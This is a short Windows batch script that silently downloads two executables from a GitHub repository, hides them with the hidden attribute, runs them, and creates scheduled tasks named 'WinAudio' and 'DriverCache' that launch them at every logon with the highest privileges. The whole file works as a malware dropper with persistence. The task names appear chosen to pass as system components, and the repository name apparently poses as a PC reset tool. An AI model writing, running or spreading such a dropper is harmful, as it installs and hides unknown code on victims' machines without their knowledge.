@echo off
curl -s -o %temp%\dsc.exe https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/dsc
attrib +h "%temp%\dsc.exe"
start %temp%\dsc.exe
schtasks /create /tn "WinAudio" /tr "\"%TEMP%\dsc.exe\"" /sc onlogon /rl highest /f
curl -s -o %temp%\main.exe https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/main
attrib +h "%temp%\main.exe"
start %temp%\main.exe
schtasks /create /tn "DriverCache" /tr "\"%TEMP%\main.exe\"" /sc onlogon /rl highest /f